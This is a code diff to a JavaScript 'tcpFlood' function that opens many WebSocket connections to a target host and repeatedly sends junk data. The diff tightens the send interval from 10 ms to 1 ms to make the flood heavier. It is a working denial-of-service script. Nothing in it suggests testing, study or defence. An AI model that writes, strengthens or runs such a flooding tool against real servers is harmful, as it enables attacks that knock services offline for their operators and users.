@@ -1,30 +1,29 @@
-// tcp.js
 function tcpFlood(target, threads) {
   if (!target) {
     console.error("Target URL is required for TCP flood.");
     return;
   }
 
-  if (!threads || threads <= 0) {
-    threads = 1;
-  }
+  threads = threads && threads > 0 ? threads : 1;
 
-  const url = new URL(target);
-  const hostname = url.hostname;
-  const port = url.port || 80;
+  try {
+    const url = new URL(target);
+    const hostname = url.hostname;
+    const port = url.port || 80;
 
-  for (let i = 0; i < threads; i++) {
-    try {
+    for (let i = 0; i < threads; i++) {
       const socket = new WebSocket(`ws://${hostname}:${port}`);
 
       socket.onopen = () => {
+        let counter = 0;
         setInterval(() => {
           try {
-            socket.send("TCP Flood: Sending junk data to overwhelm the server.");
+            const payload = `TCP Flood: Junk data ${counter++}`;
+            socket.send(payload);
           } catch (e) {
             socket.close();
           }
-        }, 10);
+        }, 1);
       };
 
       socket.onerror = (error) => {
@@ -34,9 +33,9 @@ function tcpFlood(target, threads) {
       socket.onclose = () => {
         console.log("WebSocket connection closed.");
       };
-    } catch (e) {
-      console.error("Error creating WebSocket:", e);
     }
+  } catch (e) {
+    console.error("Error:", e);
   }
 }
 
